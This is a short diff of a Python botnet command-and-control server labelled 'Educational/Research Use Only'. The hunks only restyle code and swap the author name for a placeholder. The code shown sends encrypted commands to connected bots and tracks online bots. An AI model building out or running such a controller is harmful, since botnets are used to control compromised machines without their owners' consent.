@@ -7,7 +7,7 @@ Botnet Controller (Educational/Research Use Only)
 - Tracks active bots and execution history
 - Logs events with timestamps
 
-Author: Jon Constantine
+Author: Your Name
 """
 
 import socket
@@ -74,7 +74,7 @@ class BotnetController:
                 payload = {
                     'timestamp': time.time(),
                     'cmd': encrypted_cmd.hex(),
-                    'priority': hash(os.urandom(8)) % 100
+                    'priority': hash(os.urandom(8)) % 100,
                 }
                 client_socket.send(json.dumps(payload).encode())
 
@@ -91,7 +91,9 @@ class BotnetController:
         finally:
             client_socket.close()
             with self.lock:
-                self.online_bots = {b for b in self.online_bots if b[1] != address[0]}
+                self.online_bots = {
+                    b for b in self.online_bots if b[1] != address[0]
+                }
             log_event(f"Connection closed: {address[0]}")
 
     def start(self):
